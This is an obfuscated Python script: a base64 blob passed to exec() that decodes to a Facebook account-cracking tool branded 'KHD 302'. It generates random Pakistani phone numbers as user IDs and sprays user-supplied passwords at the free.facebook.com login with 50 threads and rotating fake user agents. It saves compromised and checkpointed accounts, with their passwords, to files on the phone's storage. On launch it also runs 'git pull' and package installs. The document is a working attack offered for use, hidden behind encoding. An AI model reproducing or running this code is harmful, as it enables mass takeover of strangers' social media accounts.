import base64
exec(base64.b64decode("IyBTb3VyY2UgR2VuZXJhdGVkIHdpdGggRGVjb21weWxlKysNCiMgRmlsZTogdGVzdC5weWMgKFB5dGhvbiAzLjkpDQoNCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHV1aWQNCm9zLnN5c3RlbSgnZ2l0IHB1bGwnKQ0Kb3Muc3lzdGVtKCdwa2cgaW5zdGFsbCBjdXJsJykNCg0KZGVmIHVkKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgnIFsxXSBMSUtFIE1ZIFBBR0UnKQ0KICAgIHByaW50KCcgWzJdIEVYSVQnKQ0KICAgIG9wdCA9IGlucHV0KCdcbiAgIENob29zZSBvcHRpb24gPj4+ICcpDQogICAgaWYgb3B0ID09ICcxJzoNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL20uZmFjZWJvb2suY29tL2toZHhyc3VicmFuZCcpDQogICAgICAgIG8oKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIE5vbmUoJ1xuXHgxYlsxOzMxbUVYSVRceDFiWzA7OTdtJykNCiAgDQoNCmRlZiBvKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgnS0hJTEFESSAzMDIgRk9VTkRFUiBaRVNIQU4gQkFMT0NIIEJSQU5EJykNCiAgICBwcmludCgnJykNCiAgICBwcmludCgnXHgxYlsxOzk3bSBbMV1ceDFiWzE7OTdtIFJBTkRPTSBDUkFDSyAnKQ0KICAgIHByaW50KCdceDFiWzE7OTdtIFsyXVx4MWJbMTs5N20gQ09OVEFDVCBNRSBPTiBGQUNFQk9PSyBQQUdFJykNCiAgICBwcmludCgnXHgxYlsxOzk3bSBbMF1ceDFiWzE7OTdtIEVYSVQnKQ0KICAgIG9wdCA9IGlucHV0KCdcbiAgIFx4MWJbMTszMm0gU0VMRUNUOiAnKQ0KICAgIGlmIG9wdCA9PSAnMSc6DQogICAgICAgIGkoKQ0KICAgIGlmIE5vbmUgPT0gJzInOg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20va2hkeHJzdWJyYW5kJykNCiAgICAgICAgcmV0dXJuIE5vbmUNCiAgICBpZiBOb25lID09ICcwJzoNCiAgICAgICAgb3Muc3lzdGVtKCdleGl0JykNCiAgICAgICAgcmV0dXJuIE5vbmUNCiAgICBOb25lKCdcblx4MWJbMTszMW0gIENIT09TIENPUlJFQ1RceDFiWzA7OTdtJykNCg0KDQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpvcy5zeXN0ZW0oImdpdCBwdWxsIikNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTb3JyeSB0aGVyZSBpcyBubyBBY3RpdmUgJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclvDsMW4xb3Crl0gJXMgXHgxYlsxOzk1bSDDosuc4oCgIFlvdXIgQWN0aXZlIEFwcHMgw6LLnOKAoCAgICAgOntXSElURX0nJShHUkVFTikpDQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6DQogICAgICAgICAgICBwcmludChmIlxyWyVzJXNdICVzJXMiJShOLGkrMSxnYW1lW2ldLnJlcGxhY2UoIkRpdGFtYmFoa2FuIHBhZGEiLCIgRGl0YW1iYWhrYW4gcGFkYSIpLE4pKQ0KICAgICAgICAjZWxzZToNCiAgICAgICAgICAgICNwcmludChmJ1xyICVzWyVzISVzXSBTb3JyeSxmYWlsZWQgaW52YWxpZCBjb29raWUnJShOLE0sTikpDQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEV4cGlyZWQgQXBrJXMgICAgICAgICAgIFxuJyUoTixNLE4sTSxOKSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmJ1xyW8OwxbjFvcKuXSAlcyBceDFiWzE7OTVtIMOi4oCU4oChIFlvdXIgRXhwaXJlZCBBcHBzIMOi4oCU4oChICAgIDp7V0hJVEV9JyUoTSkpDQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6DQogICAgICAgICAgICBwcmludChmIlxyWyVzJXNdICVzJXMiJShOLGkrMSxnYW1lW2ldLnJlcGxhY2UoIktlZGFsdXdhcnNhIiwiIEtlZGFsdXdhcnNhIiksTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnJykNCiANCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL2ZyZWUuZmFjZWJvb2suY29tL3NoYWhzd2FyLmtoYW4uNTY4OCcsIHsNCiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0LCAnaHRtbC5wYXJzZXInKQ0KICAgICAgICBnZXQgPSByLmZpbmQoJ2EnLCAnSWt1dGknLCAqKignc3RyaW5nJywpKS5nZXQoJ2hyZWYnKQ0KICAgICAgICBzZXNzaW9uLmdldCgnaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSwgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogDQoNCiAgICAgICAgICANClJFRCA9ICdcMDMzWzE7OTFtJw0KV0hJVEUgPSAnXDAzM1sxOzk3bScNCkdSRUVOID0gJ1wwMzNbMTszMm0nICMNCllFTExPVyA9ICdcMDMzWzE7MzNtJw0KQkxVRSA9ICdcMDMzWzE7MzRtJw0KT1JBTkdFID0gJ1wwMzNbMTszNW0nDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJDQpBID0gJ1x4MWJbMTs5MG0nICMgV0FSTkEgQUJVIEFCVQ0KQk4gPSAnXHgxYlsxOzEwN20nICMgQkVMQUtBTkcgUFVUSUgNCkJCTCA9ICdceDFiWzE7MTA2bScgIyBCRUxBS0FORyBCSVJVIExBTkdJVA0KQlAgPSAnXHgxYlsxOzEwNW0nICMgQkVMQUtBTkcgUElOSw0KQkIgPSAnXHgxYlsxOzEwNG0nICMgQkVMQUtBTkcgQklSVQ0KQksgPSAnXHgxYlsxOzEwM20nICMgQkVMQUtBTkcgS1VOSU5HDQpCSCA9ICdceDFiWzE7MTAybScgIyBCRUxBS0FORyBISUpBVQ0KQk0gPSAnXHgxYlsxOzEwMW0nICMgQkVMQUpBTkcgTUVSQUgNCkJBID0gJ1x4MWJbMTsxMDBtJyAjIEJFTEFLQU5HIEFCVSBBQlUNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpsb2dvID0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgiIiIgICANClx4MWJbMTs5N204ODggICAgZDhQICAgODg4ICAgICAgIDg4OCAgICA4ODg4ODg4Yi4gICAgICAgIA0KXHgxYlsxOzk3bTg4OCAgIGQ4UCAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICJZODhiICAgICAgIA0KXHgxYlsxOzk3bTg4ICBkOFAgICAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICAgODg4ICAgICAgICAgICANClx4MWJbMTs5N204ODhkODhLICAgICAgODg4ODg4ODg4ODg4OCAgICA4ODggICAgIDg4OCAgICANClx4MWJbMTs5N204ODg4ODg4YiAgICAgODg4ICAgICAgIDg4OCAgICA4ODggICAgIDg4OCAgICAgIA0KXHgxYlsxOzk3bTg4OCAgWTg4YiAgICA4ODggICAgICAgODg4ICAgIDg4OCAgICAgODg4ICAgICAgDQpceDFiWzE7OTdtODg4ICAgWTg4YiAgIDg4OCAgICAgICA4ODggICAgODg4ICAgIGQ4OFAgICAgICAgDQpceDFiWzE7OTdtODg4ICAgIFk4OGIgIDg4OCAgICAgICA4ODggICAgODg4ODg4OFAiIDMwMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpcMzNbMTs0MW0gICAgICAgS0hELTMwMiBCUkFORCBSRUFMIEZBVEhFUiBPRiBISVRUTEVSICAgICAgIFwzM1swbQ0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpceDFiWzE7OTdtWytdIEFVVEhPUiAgICAgICAgIDogS0hEIDMwMiBCUkFORA0KXHgxYlsxOzk3bVsrXSBGQiBQQUdFLiAgICAgICA6IFpFRSBCQUxPQ0gNClx4MWJbMTs5N21bK10gR0lUSFVCLiAgICAgICAgOiBLSERGT1VOREVSICAgDQpceDFiWzE7OTdtWytdIFRFQU0uICAgICAgICAgIDpcMzNbMTs0Mm0gS0hEX0ZBTUlMWSBcMzNbMG0NClx4MWJbMTs5N21bK10gVkVSU0lPTiAgICAgICAgOlx4MWJbMTs5N20gMC4xICBceDFiWzE7OTdtICAgICAgICAgIA0KXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIiIiApDQpsb29wID0gMA0Kb2tzID0gW10NCmNwcyA9IFtdDQogDQpkZWYgY2xlYXIoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KZnJvbSB0aW1lIGltcG9ydCBsb2NhbHRpbWUgYXMgbHQNCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBjbWQNCmx0eCA9IGludChsdCgpWzNdKQ0KaWYgbHR4ID4gMTI6DQogICAgYSA9IGx0eC0xMg0KICAgIHRhZyA9ICJQTSINCmVsc2U6DQogICAgYSA9IGx0eA0KICAgIHRhZyA9ICJBTSINCiAgICANCiAgICANCnRyeToNCiAgICBwcmludCgnXG5cblwwMzNbMTszM21MT0FESU5HIEZJTEUgLi4uIFwwMzNbMDs5N20nKQ0KICAgIHYgPSA1LjINCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIGlmIHN0cih2KSBpbiB1cGRhdGU6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIGVsc2U6cGFzcw0KZXhjZXB0OnByaW50KCdcblwwMzNbMTszMW1DSEVDSyBUSEUgSU5URVJORVQgQ09ORUNUSU9OIC4uLiBcMDMzWzA7OTdtJykNCiNnbG9iYWwgZnVuY3Rpb25zDQpkZWYgZHluYW1pYyh0ZXh0KToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KICAgIGZvciBvIGluIHRpdGlrOg0KICAgICAgICBwcmludCgnXHInK3RleHQrbyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQogDQojVXNlciBhZ2VudHMNCnVnZW4yPVtdDQp1Z2VuPVtdDQogDQpmb3IgeGQgaW4gcmFuZ2UoMTAwMDApOg0KICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJywnMTQnLCcxNScsJzE2JywnMTcnXSkNCiAgICBjPScgZW4tdXM7IEdULScNCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpDQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvJw0KICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg3MywxMDApDQogICAgaT0nMCcNCiAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQ0KICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApDQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnDQogICAgdWFrdTI9KGYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScpDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQogICAgDQojIEFQSyBDSEVDSw0KZGVmIGkoKToNCiAgICB1c2VyPVtdDQogICAgdHdmID1bXQ0KICAgIG9zLmdldHVpZA0KICAgIG9zLmdldGV1aWQNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIA0KICAgIA0KICAgIHByaW50KCJcMDMzWzE7OTdtXHQgGiBVU0UgUEFLIE5VTSBDT0RFIBogIikNCiAgICBwcmludCgnXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICBwcmludCgnXDAzM1sxOzk3bUVYQU1QTEU6IDkyMzEwIDkyMzAxIDkyMzMxIDkyMzQ1ICAgICAnKQ0KICAgIHByaW50KCdcMDMzWzE7OTdtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgIGNvZGUgPSBpbnB1dCgnIFBVVCBDT0RFIDogJykNCiAgICBwcmludCgiIikNCiAgICBsaW1pdCA9IGludChpbnB1dCgnIEVYQU1QTEU6IDIwMDAsIDMwMDAsIDUwMDAwLCAxMDAwMDBcblxuIFBVVCBDTE9OSU5HIExJTUlUOiAnKSkNCiAgICBmb3Igbm1iciBpbiByYW5nZShsaW1pdCk6DQogICAgICAgIG5tcCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg3KSkNCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQ0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcGFzc3ggPSBpbnQoaW5wdXQoIlsqXSBFbnRlciBQYXNzd29yZCBMaW1pdCA6ICIpKQ0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHByaW50KCIiKQ0KICAgIGZvciBiaWxhbCBpbiByYW5nZShwYXNzeCk6DQogICAgICAgIHB3dyA9IGlucHV0KCJbKl0gRW50ZXIgUGFzc3dvcmQgOiAiKQ0KICAgICAgICBIYW1paUlELmFwcGVuZChwd3cpDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTUwKSBhcyBtYW5zaGVyYToNCiAgICAgICAgY2xlYXIoKQ0KICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpDQogICAgICAgIHByaW50KCdcMDMzWzE7OTdtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTs5N21bK11UT1RBTCBJRFM6ICcrdGwpDQogICAgICAgIHByaW50KCJcMDMzWzA7OTdtWytdIE5PVEU6IENQIElEWiBPUEVOIElOIDE1IERBWVMiKQ0KICAgICAgICBwcmludCgiWyFdIH5Vc2UgRmxpZ2h0IE1vZGUgNSBTZWNvbmQgQWZ0ZXIgRXZlcnkgMTAgbWludH4iKQ0KICAgICAgICBwcmludCgnXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpDQogICAgICAgIGZvciBsb3ZlIGluIHVzZXI6DQogICAgICAgICAgICBwd3ggPSBbbG92ZVsxOl1dDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIGZvciBFbWFuIGluIEhhbWlpSUQ6DQogICAgICAgICAgICAgICAgcHd4LmFwcGVuZChFbWFuKQ0KICAgICAgICAgICAgbWFuc2hlcmEuc3VibWl0KHJjcmFjayx1aWQscHd4LHRsKQ0KICAgIHByaW50KCdcMDMzWzE7OTdtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgIHByaW50KCdDcmFjayBwcm9jZXNzIGhhcyBiZWVuIGNvbXBsZXRlZCcpDQogICAgcHJpbnQoJ0lkcyBzYXZlZCBpbiBvay50eHQsY3AudHh0JykNCiAgICBwcmludCgnXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiANCmRlZiByY3JhY2sodWlkLHB3eCx0bCk6DQogICAgI3ByaW50KHVzZXIpDQogICAgZ2xvYmFsIGxvb3ANCiAgICBnbG9iYWwgY3BzDQogICAgZ2xvYmFsIG9rcw0KICAgIGdsb2JhbCBwcm94eQ0KICAgIHRyeToNCiAgICAgICAgZm9yIHBzIGluIHB3eDoNCiAgICAgICAgICAgIHBybyA9IHJhbmRvbS5jaG9pY2UodWdlbikNCiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbScpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7ImF1dGhvcml0eSI6ICdmcmVlLmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAibWV0aG9kIjogJ0dFVCcsDQogICAgICAgICAgICAic2NoZW1lIjogJ2h0dHBzJywNCiAgICAgICAgICAgICJhY2NlcHQiOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC44JywNCiAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLA0KICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ICdlbi1VUyxlbjtxPTEnLA0KICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbm8tY2FjaGUsIG5vLXN0b3JlLCBtdXN0LXJldmFsaWRhdGUnLA0KICAgICAgICAgICAgInJlZmVyZXIiOiAnaHR0cHM6Ly90LmZhY2Vib29rLmNvbS8nLA0KICAgICAgICAgICAgInNlYy1jaC11YSI6ICciR29vZ2xlIENocm9tZSI7dj0iOTAiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9Ijc1IicsDQogICAgICAgICAgICAic2VjLWNoLXVhLW1vYmlsZSI6ICc/MScsDQogICAgICAgICAgICAic2VjLWNoLXVhLXBsYXRmb3JtIjogIldpbmRvd3MiLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiAnc2FtZS1vcmlnaW4nLA0KICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjogJz8wJywNCiAgICAgICAgICAgICJwcmFnbWEiOiAnbm8tY2FjaGUnLA0KICAgICAgICAgICAgInByaW9yaXR5IjogJ3U9MCcsDQogICAgICAgICAgICAnY3Jvc3Mtb3JpZ2luLXJlc291cmNlLXBvbGljeSc6ICdjcm9zcy1vcmlnaW4nLA0KICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAnMScsDQogICAgICAgICAgICAidXNlci1hZ2VudCI6IHByb30NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL2ZyZWUuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9yZWZzcmMnLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0DQogICAgICAgICAgICBsb2dfY29va2llcz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkNCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzc6MjJdDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5Mm1bS0hEMzAyLU9LXSAnJyB8ICcgK2NpZCsgJyB8ICcgK3BzKydcMDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0tIRDMwMi1PSy50eHQnLCAnYScpLndyaXRlKCBjaWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbMjQ6MzldDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wzM1sxOzkxbVtLSEQzMDItQ1BdICcnIHwgJyArY2lkKyAnIHwgJyArcHMrJyBcMzNbMDs5N20nKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvS0hEMzAyLUNQLnR4dCcsICdhJykud3JpdGUoIGNpZCsnIHwgJytwcysnIFxuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xyICVzXDAzM1sxOzk3bVtLSEQzMDJdICAgIFwwMzNbMTs5N21bJXMvJXNdICAgXDAzM1sxOzk3bU9LIFslc11cMDMzWzE7OTdtQ1AgWyVzXSBcciclKEgsbG9vcCx0bCxsZW4ob2tzKSxsZW4oY3BzKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCiANCnVkKCkNCiA="))
